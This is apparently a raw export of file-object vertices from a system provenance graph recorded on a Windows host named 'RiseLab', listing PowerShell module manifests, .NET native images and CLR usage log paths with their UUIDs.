+Key: uuid, Value: D37FB2BD-122E-4D0D-9650-6200F6608392
+Vertex ID: 339025
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetSecurity\\NetSecurity.psd1
+Key: uuid, Value: 01A09313-47C9-45C1-96BC-7C170EFCA004
+Vertex ID: 339026
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetSwitchTeam\\NetSwitchTeam.psd1
+Key: uuid, Value: 8ABF25E2-D7DC-47F3-B148-7A24CFDD804F
+Vertex ID: 339027
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetTCPIP\\NetTCPIP.psd1
+Key: uuid, Value: 0C463A8B-A957-4EDC-A998-DF068C816A33
+Vertex ID: 339028
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetworkConnectivityStatus\\NetworkConnectivityStatus.psd1
+Key: uuid, Value: 90A6E5D3-F0B3-4493-8D81-501B0B9BD8AF
+Vertex ID: 339029
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetworkSwitchManager\\NetworkSwitchManager.psd1
+Key: uuid, Value: 82D949A4-D94E-4722-89CE-328007FA6849
+Vertex ID: 339038
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetworkTransition\\NetworkTransition.psd1
+Key: uuid, Value: A4F3F0AD-DCCA-4001-92BD-AA10180339A5
+Vertex ID: 339039
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PcsvDevice\\PcsvDevice.psd1
+Key: uuid, Value: E1CBCF63-6B50-4AF2-AADF-C57621BD0469
+Vertex ID: 339040
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PKI\\pki.psd1
+Key: uuid, Value: B81195D8-5516-43BF-829B-9DB03C18356E
+Vertex ID: 339043
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PnpDevice\\PnpDevice.psd1
+Key: uuid, Value: CE1B861F-D338-4D80-9EA0-650077E21134
+Vertex ID: 339044
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\PrintManagement.psd1
+Key: uuid, Value: 5CB8FF43-2D09-4907-BA42-B6B72F23F8F8
+Vertex ID: 339063
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_Printer_v1.0.cdxml
+Key: uuid, Value: 26DEE281-47E4-4E90-8CEC-EA4677ACBEA2
+Vertex ID: 339064
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_PrinterPort_v1.0.cdxml
+Key: uuid, Value: 1D4B2FE8-89C9-4C6D-8F7B-02DE80F8ADCB
+Vertex ID: 339065
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_PrinterPortTasks_v1.0.cdxml
+Key: uuid, Value: EE91944B-BD06-4727-85FB-49506A00645B
+Vertex ID: 339066
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_PrinterDriver_v1.0.cdxml
+Key: uuid, Value: 2B7ADB58-03A0-4429-91B3-62AC81D5DE6D
+Vertex ID: 339067
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_PrinterConfiguration_v1.0.cdxml
+Key: uuid, Value: C5E5ECE4-8B3F-4C09-BDFC-6B4651A51FB4
+Vertex ID: 339068
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_PrintJob_v1.0.cdxml
+Key: uuid, Value: 34902A3C-8BF6-4910-A100-6009DE4E17FC
+Vertex ID: 339069
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_LprPrinterPort_v1.0.cdxml
+Key: uuid, Value: B8806E2C-03C4-405D-AF68-101EEA89EB0C
+Vertex ID: 339070
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_LocalPrinterPort_v1.0.cdxml
+Key: uuid, Value: 445187CC-A5E4-4DBF-88E6-5EB396C933E1
+Vertex ID: 339071
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_TcpIpPrinterPort_v1.0.cdxml
+Key: uuid, Value: 9F7641BC-51C6-42B4-9DB9-88D56FBE618D
+Vertex ID: 339072
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_WsdPrinterPort_v1.0.cdxml
+Key: uuid, Value: 71A46F41-EF3B-43AE-9D3A-6178ABEF3B1D
+Vertex ID: 339073
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_PrinterProperty_v1.0.cdxml
+Key: uuid, Value: 5B300C2E-2B0D-48F7-8F08-AF00A5A89EB2
+Vertex ID: 339074
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_PrinterNfcTag_v1.0.cdxml
+Key: uuid, Value: E2CB5C70-F7D2-497F-96E2-77A8DB9A206A
+Vertex ID: 339075
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_PrinterNfcTagTasks_v1.0.cdxml
+Key: uuid, Value: 2D9F70A1-04EA-4CD6-9FE4-D0C1BEC14C43
+Vertex ID: 339076
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagement\\MSFT_3DPrinter_v1.0.cdxml
+Key: uuid, Value: 0688DDC9-D027-4AAC-8EC4-F32180074465
+Vertex ID: 339077
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ProcessMitigations\\ProcessMitigations.psd1
+Key: uuid, Value: CCE79278-85DB-429C-AB4F-B5978DB9744F
+Vertex ID: 339078
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Provisioning\\provisioning.psd1
+Key: uuid, Value: A06872F2-5A1E-4E8E-933B-AC8A958542F4
+Vertex ID: 339079
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSDesiredStateConfiguration\\PSDesiredStateConfiguration.psd1
+Key: uuid, Value: C0144EA9-476A-47B3-B18C-DE5A00776805
+Vertex ID: 339080
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSDiagnostics\\PSDiagnostics.psd1
+Key: uuid, Value: 90CA3BB8-BC02-4628-9B08-540866115BE6
+Vertex ID: 339081
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSScheduledJob\\PSScheduledJob.psd1
+Key: uuid, Value: FB1D0472-22EC-4ADD-95AF-F2076F4CF262
+Vertex ID: 339082
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSWorkflow\\PSWorkflow.psd1
+Key: uuid, Value: 3831A07F-F8ED-4A11-A3A6-A2634235AE26
+Vertex ID: 339083
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSWorkflowUtility\\PSWorkflowUtility.psd1
+Key: uuid, Value: 5C7EFF41-AA61-4B7D-B609-F9831C5EAC97
+Vertex ID: 339084
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ScheduledTasks\\ScheduledTasks.psd1
+Key: uuid, Value: ED74CF74-0299-4E7D-B8B4-B5B3D544228B
+Vertex ID: 339085
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\SecureBoot\\SecureBoot.psd1
+Key: uuid, Value: 50F4B9F5-6BFC-4BE1-BD64-1E2D20A87399
+Vertex ID: 46175
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.S1bc92e04#\\d8892b07be4daa0bab71835045437e2f\\Microsoft.SecureBoot.Commands.ni.dll.aux
+Key: uuid, Value: 1CF1BD33-3589-42F8-9E6D-D3CE9C093C30
+Vertex ID: 339091
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\SmbShare\\SmbShare.psd1
+Key: uuid, Value: D03CE41B-D3E8-4178-94AD-DF57D094F470
+Vertex ID: 339092
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\SmbWitness\\SmbWitness.psd1
+Key: uuid, Value: CBC66191-F9FB-43B1-A488-2A6BC279FAA7
+Vertex ID: 339093
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\StartLayout\\StartLayout.psd1
+Key: uuid, Value: C9DD91FF-8048-4D63-BD14-3320A3AB9C38
+Vertex ID: 46035
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.W8fd2476e#\\a7c5b8eb337bf73cd89cf1b6b0d3bf4b\\Microsoft.Windows.StartLayout.Commands.ni.dll.aux
+Key: uuid, Value: 439E48DF-4EB0-433F-8DA4-4B214644782E
+Vertex ID: 339097
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Storage\\Storage.psd1
+Key: uuid, Value: BF1783EA-7D7A-4D2D-8190-A56C0123A75D
+Vertex ID: 339098
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\TLS\\tls.psd1
+Key: uuid, Value: 5F1A3A73-149D-4A99-AC48-D232AFB344C4
+Vertex ID: 46963
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.W2ded559f#\\1156abbb6cd3230f0e2db16b032baa4e\\Microsoft.WindowsAuthenticationProtocols.Commands.ni.dll.aux
+Key: uuid, Value: 783AA27E-62F6-48F6-A5F3-7EEA261F225E
+Vertex ID: 339100
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_64\\Microsoft.WindowsAuthenticationProtocols.Commands\\v4.0_10.0.0.0__31bf3856ad364e35\\Microsoft.WindowsAuthenticationProtocols.Commands.dll
+Key: uuid, Value: 420AC82B-0961-47DB-BE38-6AACA0D7C735
+Vertex ID: 339103
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\TroubleshootingPack\\TroubleshootingPack.psd1
+Key: uuid, Value: F1225790-DB81-452A-B090-40222257063A
+Vertex ID: 339105
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\TrustedPlatformModule\\TrustedPlatformModule.psd1
+Key: uuid, Value: 964E0D75-1CB7-48B6-BDF8-5B7AD489A2F3
+Vertex ID: 339107
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\UEV\\UEV.psd1
+Key: uuid, Value: EBBACE0B-A32B-4EF5-9C57-8A625AAA4169
+Vertex ID: 339110
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\UEV\\Microsoft.Uev.Commands.dll
+Key: uuid, Value: 2C5C8D51-E678-415A-8E33-BC5591033060
+Vertex ID: 339112
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\VpnClient\\VpnClient.psd1
+Key: uuid, Value: 267E9FD8-6CC6-4288-8AAB-C9F6BB791BA7
+Vertex ID: 339113
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Wdac\\Wdac.psd1
+Key: uuid, Value: 2A6790FF-4BAE-4FE7-A316-6746FF81CB25
+Vertex ID: 339114
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsDeveloperLicense\\WindowsDeveloperLicense.psd1
+Key: uuid, Value: BC0DD290-88D7-4C6E-88D0-251107810C5A
+Vertex ID: 339115
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsErrorReporting\\WindowsErrorReporting.psd1
+Key: uuid, Value: 0F41170A-581B-43F7-8290-4F24E8D84E28
+Vertex ID: 339118
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsErrorReporting\\Microsoft.WindowsErrorReporting.PowerShell.dll
+Key: uuid, Value: 15C5E462-EA41-4E90-873A-3B0E06457318
+Vertex ID: 339117
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsErrorReporting\\WindowsErrorReporting.psm1
+Key: uuid, Value: 76917599-15FB-442E-9783-F068DDE3CAC9
+Vertex ID: 339119
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsSearch\\WindowsSearch.psd1
+Key: uuid, Value: F73F95E0-DA23-4F1C-9C8E-DE9751DCEC9B
+Vertex ID: 339120
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsSearch\\Microsoft.WindowsSearch.Commands.dll
+Key: uuid, Value: 6C40D23C-E2A4-4215-A43C-21A23FB06223
+Vertex ID: 47041
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Wcffedcb4#\\06b3f11e3816194b66b131ceb670af84\\Microsoft.WindowsSearch.Commands.ni.dll.aux
+Key: uuid, Value: D1F2ED13-A3C4-4DAE-9A72-6F24DC24B6BE
+Vertex ID: 339122
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsUpdate\\WindowsUpdate.psd1
+Key: uuid, Value: 6314263A-5DA5-48C0-8EC0-F667FCC244AC
+Vertex ID: 339123
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsUpdateProvider\\WindowsUpdateProvider.psd1
+Key: uuid, Value: 0179DA72-D3DE-4C10-9086-7177B0B25518
+Vertex ID: 339129
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsUpdateProvider\\MSFT_WUUpdate.cdxml
+Key: uuid, Value: DB7F05D9-5888-4C1A-ACA5-2BE5330C7A6D
+Vertex ID: 339130
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsUpdateProvider\\MSFT_WUSettings.cdxml
+Key: uuid, Value: 24995895-1C0B-4A1D-91CF-9F853E76D213
+Vertex ID: 339131
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\WindowsUpdateProvider\\MSFT_WUOperations.cdxml
+Key: uuid, Value: 25B2CC82-2C59-4458-BE7D-68ABFAEF2074
+Vertex ID: 46122
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\Microsoft.CSharp\\v4.0_4.0.0.0__b03f5f7f11d50a3a\\Microsoft.CSharp.dll
+Key: uuid, Value: 884DDAB4-C2DC-4908-877D-3DFB5739E767
+Vertex ID: 46116
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll
+Key: uuid, Value: 9DE5F86F-4D30-4507-926D-AAFCA80899C4
+Vertex ID: 1975
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\msctf.dll
+Key: uuid, Value: F342E481-5C3F-43DF-B70B-ED222C4FD5C0
+Vertex ID: 180535
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\SMDiagnostics\\v4.0_4.0.0.0__b77a5c561934e089\\SMDiagnostics.dll
+Key: uuid, Value: 7C663A36-560C-4B52-AE91-95AD0FABD9B6
+Vertex ID: 338862
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.ServiceModel.Internals\\v4.0_4.0.0.0__31bf3856ad364e35\\System.ServiceModel.Internals.dll
+Key: uuid, Value: 93E41264-43BA-4E6E-9CDA-3DD9E4965FCA
+Vertex ID: 343717
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\hhctrl.ocx
+Key: uuid, Value: 8BE8059C-356C-45D1-8BE1-2D2E788EAB28
+Vertex ID: 338879
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ISE\\S-1-5-5-0-375932\\PowerShellISEPipeName_0_9bdb1031-69c4-4ca1-aaf2-418c0cd8490c
+Key: uuid, Value: 801B6048-528A-4C52-A51D-1C68370027AA
+Vertex ID: 45489
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config
+Key: uuid, Value: D725237D-8CA4-4876-913A-D51F9700C7B4
+Vertex ID: 45490
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\8a9c7ab28dfd1baa08e20283667c4c7e\\mscorlib.ni.dll.aux
+Key: uuid, Value: 2297E9EF-6D0D-4A45-84A3-5B9919A1A685
+Vertex ID: 45491
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\0c9bec7e4e969db233900a4588c91656\\System.ni.dll.aux
+Key: uuid, Value: 1297D5B9-7EC2-4369-A6FA-8166AC976809
+Vertex ID: 45492
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.log
+Key: uuid, Value: 38741730-7C7F-498B-BB7E-B0BA5CFADFCE
+Vertex ID: 45493
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\88dea3dcba1b28955a1a9346e1f346a2\\System.Core.ni.dll.aux
+Key: uuid, Value: 4D836764-5B89-4D45-911D-15FAD01B0847
+Vertex ID: 45494
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\ace81fc29ee797953e01b4d1432bf7b9\\System.Management.ni.dll.aux
+Key: uuid, Value: 4A7B317E-7301-4D68-8199-73CBC9A09EF4
+Vertex ID: 45639
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\mmc.exe.log
+Key: uuid, Value: F716C220-ECC9-4995-B9C2-920924AF940E
+Vertex ID: 45497
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\NGenTask.exe.log
+Key: uuid, Value: 99240644-4289-4184-A5A1-648F0103DDE5
+Vertex ID: 45498
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\sdiagnhost.exe.log
+Key: uuid, Value: 060BAC84-9EB0-4CF5-BBDA-2BD164CD55F2
+Vertex ID: 45814
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\darpa\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\NGenTask.exe.log
+Key: uuid, Value: BB5B5D02-2AFC-4270-AB9F-087C97F32B4C
+Vertex ID: 45499
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\NGenTask.exe.log
+Key: uuid, Value: D5916888-AF60-496D-B2C1-D564960E3609
+Vertex ID: 45500
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\powershell.exe.log
+Key: uuid, Value: 1E5A3CCF-79ED-4AE6-AA2A-85829D52DFD9
+Vertex ID: 45501
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\taskhostw.exe.log
+Key: uuid, Value: ECB798DD-4753-4EE2-9D0C-202381AA9263
+Vertex ID: 45502
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
